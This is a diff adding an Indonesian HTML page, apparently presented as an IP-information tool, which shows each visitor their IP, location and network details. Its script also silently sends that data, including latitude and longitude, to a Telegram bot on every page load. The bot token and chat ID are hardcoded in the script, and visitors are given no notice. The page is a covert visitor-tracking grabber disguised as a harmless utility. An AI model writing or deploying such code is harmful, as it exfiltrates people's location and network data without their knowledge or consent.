@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="id">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Informasi IP by dyvsss</title>
+        <meta name="description" content="Web program TailwindCSS | AndyJs" />
+        <meta name="author" content="andyjavadams" />
+        <link rel="icon" href="https://c.top4top.io/p_208369npm0.png" />
+        <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+    <body class="bg-slate-100 p-4">
+        <h1 class="text-3xl font-bold mb-4">Informasi IP</h1>
+        <div class="bg-white shadow-md p-4 rounded-md">
+            <h2 class="text-xl font-bold mb-2">IP ADDRESS</h2>
+            <p class="mb-2" id="ip"></p>
+            <h2 class="text-xl font-bold mb-2">Lokasi</h2>
+            <p class="mb-2" id="city"></p>
+            <p class="mb-2" id="region"></p>
+            <p class="mb-2" id="country_name"></p>
+            <p class="mb-2" id="country_code"></p>
+            <p class="mb-2" id="continent"></p>
+            <p class="mb-2" id="latitude"></p>
+            <p class="mb-2" id="longitude"></p>
+
+            <h2 class="text-xl font-bold mb-2">Jaringan</h2>
+            <p class="mb-2" id="isp"></p>
+            <p class="mb-2" id="asn"></p>
+            <p class="mb-2" id="as_name"></p>
+
+            <h2 class="text-xl font-bold mb-2">Informasi Lain</h2>
+            <p class="mb-2" id="postal"></p>
+            <p class="mb-2" id="timezone"></p>
+            <p class="mb-2" id="utc_offset"></p>
+            <p class="mb-2" id="currency"></p>
+            <p class="mb-2" id="language"></p>
+        </div>
+
+        <script>
+            const tokenTelegram =
+                "7635333228:AAHS0IxiIvr7ogT04unpJ-1GqXBN42n4peM";
+            const chatIdTelegram = "7567784758";
+
+            fetch("https://ipapi.co/json")
+                .then(response => response.json())
+                .then(andy => {
+                    const pesan = `
+IP : ${andy.ip}
+Lokasi: ${andy.city}, ${andy.region}, ${andy.country_name}
+Kode Negara: ${andy.country_code}
+Benua: ${andy.continent}
+Latitude: ${andy.latitude}
+Longitude: ${andy.longitude}
+ISP: ${andy.isp}
+ASN: ${andy.asn}
+Kode Pos: ${andy.postal}
+Zona Waktu: ${andy.timezone}
+Perbedaan Waktu UTC: ${andy.utc_offset}
+Mata Uang: ${andy.currency}
+Bahasa: ${andy.language}
+        `;
+
+                    document.getElementById(
+                        "city"
+                    ).innerHTML = `Kota: ${andy.city}`;
+                    document.getElementById("ip").innerHTML = `IP: ${andy.ip}`;
+                    document.getElementById(
+                        "region"
+                    ).innerHTML = `Provinsi: ${andy.region}`;
+                    document.getElementById(
+                        "country_name"
+                    ).innerHTML = `Negara: ${andy.country_name}`;
+                    document.getElementById(
+                        "country_code"
+                    ).innerHTML = `Kode Negara: ${andy.country_code}`;
+                    document.getElementById(
+                        "continent"
+                    ).innerHTML = `Benua: ${andy.continent}`;
+                    document.getElementById(
+                        "latitude"
+                    ).innerHTML = `Latitude: ${andy.latitude}`;
+                    document.getElementById(
+                        "longitude"
+                    ).innerHTML = `Longitude: ${andy.longitude}`;
+                    document.getElementById(
+                        "isp"
+                    ).innerHTML = `ISP: ${andy.isp}`;
+                    document.getElementById(
+                        "asn"
+                    ).innerHTML = `ASN: ${andy.asn}`;
+                    document.getElementById(
+                        "as_name"
+                    ).innerHTML = `Nama ASN: ${andy.as_name}`;
+                    document.getElementById(
+                        "postal"
+                    ).innerHTML = `Kode Pos: ${andy.postal}`;
+                    document.getElementById(
+                        "timezone"
+                    ).innerHTML = `Zona Waktu: ${andy.timezone}`;
+                    document.getElementById(
+                        "utc_offset"
+                    ).innerHTML = `Perbedaan Waktu UTC: ${andy.utc_offset}`;
+                    document.getElementById(
+                        "currency"
+                    ).innerHTML = `Mata Uang: ${andy.currency}`;
+                    document.getElementById(
+                        "language"
+                    ).innerHTML = `Bahasa: ${andy.language}`;
+
+                    fetch(
+                        `https://api.telegram.org/bot${tokenTelegram}/sendMessage`,
+                        {
+                            method: "POST",
+                            headers: {
+                                "Content-Type":
+                                    "application/x-www-form-urlencoded"
+                            },
+                            body: `chat_id=${chatIdTelegram}&text=${pesan}`
+                        }
+                    )
+                        .then(res => console.log("Pesan terkirim!"))
+                        .catch(error => console.error("Error:", error));
+                })
+                .catch(error => console.error("Error:", error));
+        </script>
+    </body>
+</html>
